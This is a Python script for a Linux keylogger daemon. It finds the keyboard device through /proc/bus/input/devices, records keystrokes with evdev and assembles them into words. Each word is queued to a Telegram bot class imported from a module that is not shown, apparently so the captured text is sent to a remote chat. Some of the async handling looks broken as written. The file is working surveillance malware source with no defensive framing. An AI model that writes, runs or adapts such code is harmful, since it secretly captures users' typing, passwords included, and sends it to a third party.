#! /usr/bin/python

import asyncio
import evdev
from bot import TGBot
import subprocess as sp
import multiprocessing as mp
import re
from daemon import daemon
import sys


grep_event = "grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'"


keys = {"KEY_Q": "Q",
        "KEY_W": "W",
        "KEY_E": "E",
        "KEY_R": "R",
        "KEY_T": "T",
        "KEY_Y": "Y",
        "KEY_U": "U",
        "KEY_I": "I",
        "KEY_O": "O",
        "KEY_P": "P",
        "KEY_A": "A",
        "KEY_S": "S",
        "KEY_D": "D",
        "KEY_F": "F",
        "KEY_G": "G",
        "KEY_H": "H",
        "KEY_J": "J",
        "KEY_K": "K",
        "KEY_L": "L",
        "KEY_Z": "Z",
        "KEY_X": "X",
        "KEY_C": "C",
        "KEY_V": "V",
        "KEY_B": "B",
        "KEY_N": "N",
        "KEY_M": "M",
        "KEY_0": "0",
        "KEY_1": "1",
        "KEY_2": "2",
        "KEY_3": "3",
        "KEY_4": "4",
        "KEY_5": "5",
        "KEY_6": "6",
        "KEY_7": "7",
        "KEY_8": "8",
        "KEY_9": "9"}


def find_event():
    args = ["/bin/sh", "-c", grep_event]
    process = sp.Popen(args, stdin=sp.PIPE, stdout=sp.PIPE, universal_newlines=True)
    try:
        out, _ = process.communicate(timeout=10)
        return out[:-1]

    except sp.TimeoutExpired:
        process.kill()
        print("Subproc killed")

def grub_and_send_words(q, device):
    word = []
    # bot = TGBot()
    for event in device.async_read_loop():
        m = re.search('([A-Z])\w+., down', str(evdev.categorize(event)))
        
        if m:
            m = re.search('([A-Z])\w+', m.group(0))
            key_name = m.group(0)
            try:
                word.append(keys[key_name])
 
            except KeyError:
                if word:
                    if key_name == "KEY_BACKSPACE":
                        word = word[:-1]
                    else:
                        q.put(''.join(word))
                        word = []


def creare_bot(q):
    TGBot(q)

class MyDaemon(daemon):
    def run(self):
        event = find_event()
        device = evdev.InputDevice('/dev/input/' + event)

        q = mp.Queue()
        botProcess = mp.Process(target=creare_bot, args=(q,))
        botProcess.start()

        asyncio.ensure_future(grub_and_send_words(q, device))
        loop = asyncio.get_event_loop()
        loop.run_forever()


def main():
    daemon = MyDaemon('/tmp/daemon-example.pid')
    if len(sys.argv) == 2:
        if 'start' == sys.argv[1]:
            daemon.start()
        elif 'stop' == sys.argv[1]:
            daemon.stop()
        elif 'restart' == sys.argv[1]:
            daemon.restart()
        else:
            print("Unknown command")
            sys.exit(2)
        sys.exit(0)
    else:
        print("usage: %s start|stop|restart" % sys.argv[0])
        sys.exit(2)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nGoodbye.")
